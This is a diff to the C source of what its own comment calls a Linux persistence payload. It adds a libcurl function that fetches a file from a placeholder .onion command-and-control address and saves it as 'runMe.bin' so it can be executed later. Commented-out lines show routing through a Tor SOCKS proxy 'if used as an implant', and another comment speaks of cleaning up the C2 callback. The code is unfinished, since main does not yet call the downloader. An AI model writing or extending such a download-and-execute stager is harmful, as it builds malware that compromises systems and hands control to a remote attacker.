@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <curl/curl.h>
 
 /* 
  * This is a pure C payload meant to target Linux systems in an effort to establish persistence. 
@@ -16,7 +17,34 @@ char * CADDRESS = "sample-string.onion";
 
 int main(int argc, char * argv[]) {
 	
-	// I have misplaced the web request code I was going to start with...
+	// Need to cleanup the C2 callback
 
 	return 0;
 }
+
+int webRequestOverTor() {
+    CURL *curl;
+    CURLcode res;
+
+    freopen("runMe.bin", "w", stdout);				// redirecting STDOUT to a file such that whatever is retrieved can be executed later
+
+    curl = curl_easy_init();									// Initializing the structure needed to make requests
+    if (curl) {
+        curl_easy_setopt(curl, CURLOPT_URL, "http://XXXXXXXXXXXXXX.onion/download");		// Setting the server
+
+        // curl_easy_setopt(curl, CURLOPT_PROXY, "socks5h://127.0.0.1:9050"); 			// Setting the proxy (if used as an implant, change this to public SOCKS5 instance with HIA)
+
+        res = curl_easy_perform(curl);								// Make the request
+
+        if (res != CURLE_OK)									// Handling errors
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+
+        curl_easy_cleanup(curl);								// Cleaning up the structure we initialized earlier
+    }
+
+    // cleaning up output redirection
+    // freopen("/dev/tty", "w", stdout);		// Linux
+
+    return 0;
+}
+
